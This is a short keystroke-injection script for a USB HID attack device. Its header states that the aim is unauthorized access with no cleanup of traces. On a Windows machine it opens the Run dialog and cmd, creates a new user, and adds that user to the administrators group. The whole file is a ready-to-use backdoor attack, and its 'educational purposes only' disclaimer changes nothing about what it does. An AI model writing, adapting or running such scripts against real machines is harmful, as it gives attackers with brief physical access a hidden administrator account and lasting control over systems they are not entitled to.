/*
   HIDScript for Quick Compromise Scenario with User Creation (No Cleaning Trace)
   Objective: Gain unauthorized access by creating a new user with admin rights

   Steps:
   1. Open the Run dialog and start a command prompt
   2. Create a new user account with administrative privileges
   3. Add the new user to the administrators group

   Notes:
   - *Change <user> and <password>* (yes remove the <>'s)
   - This script is for educational purposes only and should be used ethically.
   - Always ensure proper authorization and adhere to legal and ethical guidelines.
*/
layout("us");
// Initial delay to ensure the system recognizes the HID device
delay(1000);

// Open the Run dialog
press("GUI r");
delay(500);

// Type "cmd" to open the command prompt
type("cmd");
press("ENTER");
delay(1000);

// Create a new user account
type("net user <user> <password> /add");
press("ENTER");
delay(1000);

// Add the user to the administrators group
type("net localgroup administrators <user> /add");
press("ENTER");
delay(1000);

// Exit the command prompt
type("exit");
press("ENTER");
